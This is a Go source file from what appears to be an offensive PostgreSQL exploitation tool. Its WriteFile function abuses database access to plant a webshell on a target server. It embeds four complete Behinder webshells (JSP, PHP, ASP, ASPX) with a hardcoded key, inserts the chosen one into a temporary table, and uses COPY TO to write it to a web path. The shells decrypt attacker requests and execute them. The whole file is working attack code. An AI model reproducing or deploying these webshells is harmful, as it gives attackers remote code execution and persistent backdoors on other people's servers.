package pac

import (
	"database/sql"
	"fmt"
)

func WriteFile(conn *sql.DB, uploadPath string, e string) {
	table := RandStr(3)

	Info("创建表")
	_, err := postgrecmd(fmt.Sprintf("CREATE TABLE %s (t TEXT);", table), conn)
	if err != nil {
		Err(err)
	}

	if e == "jsp" {
		Webshell = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
	} else if e == "php" {
		Webshell = "<?php\n@error_reporting(0);\nsession_start();\n    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>\n"
	} else if e == "asp" {
		Webshell = "<%\nResponse.CharSet = \"UTF-8\" \nk=\"e45e329feb5d925b\" '该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\nSession(\"k\")=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\n%>"
	} else if e == "aspx" {
		Webshell = "<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%>\n"
	}

	Info("往表中插入Webshell")
	_, err = postgrecmd(fmt.Sprintf("INSERT INTO %s(t) VALUES ('%s');", table, Webshell), conn)
	if err != nil {
		Err(err)
	}

	Info("将webshell导出,冰蝎默认的webshell")
	_, err = postgrecmd(fmt.Sprintf("COPY %s(t) TO '%s';", table, uploadPath), conn)
	if err != nil {
		Err(err)
	}

}
